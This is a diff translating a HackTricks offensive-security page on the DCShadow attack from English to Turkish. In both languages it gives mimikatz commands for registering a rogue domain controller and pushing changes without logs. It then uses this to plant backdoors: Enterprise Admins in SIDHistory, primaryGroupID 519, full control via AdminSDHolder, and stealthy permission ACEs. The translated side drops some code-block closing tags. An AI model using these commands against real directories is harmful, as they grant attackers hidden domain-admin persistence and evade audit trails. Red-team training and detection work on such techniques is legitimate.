@@ -1,75 +1,67 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
 
 </details>
 
 
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Bu, AD'de bir **yeni Etki Alanı Denetleyicisi** kaydeder ve belirtilen nesneler üzerinde (SIDHistory, SPN'ler...) **özellikleri itmek** için kullanırken herhangi bir **değişiklik** hakkında **günlük** bırakmadan kullanır. **DA** ayrıcalıklarına ve **kök etki alanı** içinde olmanız gerekmektedir.\
+Yanlış veri kullanırsanız, oldukça kötü günlükler ortaya çıkacaktır.
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
+Saldırıyı gerçekleştirmek için 2 mimikatz örneğine ihtiyacınız vardır. Bunlardan biri, SYSTEM ayrıcalıklarıyla RPC sunucularını başlatacak (burada yapmak istediğiniz değişiklikleri belirtmelisiniz) ve diğer örnek değerleri itmek için kullanılacaktır:
 
-{% code title="mimikatz1 (RPC servers)" %}
+{% code title="mimikatz1 (RPC sunucuları)" %}
 ```bash
 !+
 !processtoken
 lsadump::dcshadow /object:username /attribute:Description /value="My new description"
 ```
-{% endcode %}
-
-{% code title="mimikatz2 (push) - Needs DA or similar" %}
+{% code title="mimikatz2 (push) - DA veya benzeri yetkiye ihtiyaç duyar" %}
 ```bash
 lsadump::dcshadow /push
 ```
 {% endcode %}
 
-Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+**`elevate::token`**'un `mimikatz1` oturumunda çalışmayacağını unutmayın, çünkü bu işlem yalnızca iş parçacığının ayrıcalıklarını yükseltir, ancak **işlemin ayrıcalığını** yükseltmemiz gerekmektedir.\
+Ayrıca "LDAP" nesnesini seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-You can push the changes from a DA or from a user with this minimal permissions:
+Bu değişiklikleri DA (Domain Admin) veya bu en düşük izinlere sahip bir kullanıcıdan yapabilirsiniz:
 
-* In the **domain object**:
-  * _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  * _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  * _DS-Replication-Synchronize_ (Replication Synchornization)
-* The **Sites object** (and its children) in the **Configuration container**:
-  * _CreateChild and DeleteChild_
-* The object of the **computer which is registered as a DC**:
-  * _WriteProperty_ (Not Write)
-* The **target object**:
-  * _WriteProperty_ (Not Write)
+* **Domain nesnesi** içinde:
+* _DS-Install-Replica_ (Alan İçinde Kopya Ekle/Kaldır)
+* _DS-Replication-Manage-Topology_ (Replikasyon Topolojisini Yönet)
+* _DS-Replication-Synchronize_ (Replikasyon Senkronizasyonu)
+* **Yapılandırma konteynırı** içindeki **Sites nesnesi** (ve alt nesneleri):
+* _CreateChild ve DeleteChild_
+* **DC olarak kaydedilmiş olan bilgisayarın nesnesi**:
+* _WriteProperty_ (Yazma değil)
+* **Hedef nesne**:
+* _WriteProperty_ (Yazma değil)
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
+Bu ayrıcalıkları ayrıcalıksız bir kullanıcıya vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) komutunu kullanabilirsiniz (bu işlem bazı loglar bırakacaktır). Bu, DA (Domain Admin) ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
+Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**student1**_ kullanıcı adına sahip olan _**mcorp-student1**_ makinesinde oturum açıldığında _**root1user**_ nesnesi üzerinde DCShadow izinlerine sahip olduğu anlamına gelir.
 
-## Using DCShadow to create backdoors
+## DCShadow kullanarak arka kapılar oluşturma
 
-{% code title="Set Enterprise Admins in SIDHistory to a user" %}
+{% code title="SIDHistory'de bir kullanıcıya Enterprise Admins atama" %}
 ```bash
-lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
+lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
-{% endcode %}
-
-{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %}
+{% code title="PrimaryGroupID'yi Değiştirin (kullanıcıyı Domain Yöneticileri üyesi yapın)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
-{% endcode %}
-
-{% code title="Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)" %}
+{% code title="AdminSDHolder'ın ntSecurityDescriptor'ını değiştirin (bir kullanıcıya Tam Denetim verin)" %}
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
@@ -78,39 +70,35 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 ```
 {% endcode %}
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+## Shadowception - DCShadow kullanarak DCShadow izinleri verme (değiştirilmiş izin günlükleri olmadan)
 
-We need to append following ACEs with our user's SID at the end:
+Aşağıdaki ACE'leri kullanıcının SID'siyle birlikte eklememiz gerekiyor:
 
-* On the domain object:
-  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-* On the attacker computer object: `(A;;WP;;;UserSID)`
-* On the target user object: `(A;;WP;;;UserSID)`
-* On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+* Etki alanı nesnesi üzerinde:
+* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+* Saldırgan bilgisayar nesnesi üzerinde: `(A;;WP;;;UserSID)`
+* Hedef kullanıcı nesnesi üzerinde: `(A;;WP;;;UserSID)`
+* Yapılandırma konteynerindeki Siteler nesnesi üzerinde: `(A;CI;CCDC;;;UserSID)`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
+Dikkat edin, bu durumda sadece bir tane değil, **birkaç değişiklik yapmanız gerekiyor.** Bu nedenle, **mimikatz1 oturumu** (RPC sunucusu) içinde her değişiklik için **`/stack` parametresini kullanın.** Bu şekilde, tüm takılan değişiklikleri tek bir **`/push`** işlemiyle gerçekleştirmek için yeterli olacaktır.
 
-
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**DCShadow hakkında daha fazla bilgi için ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın.**
 
 </details>
-
-
